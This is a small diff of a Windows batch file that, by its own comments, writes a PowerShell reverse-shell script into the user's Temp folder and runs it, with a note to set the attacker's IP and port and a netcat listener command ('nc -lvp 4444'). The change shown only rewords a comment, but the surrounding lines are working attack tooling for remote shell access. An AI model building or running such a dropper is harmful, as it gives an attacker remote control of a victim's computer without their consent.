@@ -2,7 +2,7 @@
 @echo off
 rem Batch file will create Powershell script and run it after created
 rem Modify IP and Port as required
-rem start nc listener or for more fun start a meter listener
+rem start nc listener (for more fun start a meter listener)
 rem nc -lvp 4444
 echo function cleanup { > "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
 echo if ($client.Connected -eq $true) {$client.Close()} >> "C:\Users\%USERNAME%\AppData\Local\Temp\shell.ps1
